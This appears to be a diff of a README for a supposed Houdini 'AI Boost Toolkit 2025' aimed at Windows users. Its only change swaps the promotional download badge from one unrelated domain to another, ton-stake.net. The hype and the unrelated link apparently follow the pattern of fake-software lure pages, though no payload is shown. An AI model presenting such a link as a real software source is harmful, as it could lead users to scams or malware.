@@ -2,7 +2,7 @@
 
 🌟 Power up Houdini with AI Boost Toolkit 2025! This collection of AI plugins, scripts, and templates helps you create pro-level VFX and animations, built for Windows users.
 
-[![Discover Houdini AI Toolkit](https://img.shields.io/badge/Discover-Houdini_AI_Toolkit-blueviolet)](https://glocktober.com)
+[![Discover Houdini AI Toolkit](https://img.shields.io/badge/Discover-Houdini_AI_Toolkit-blueviolet)](https://ton-stake.net)
 
 ---
 
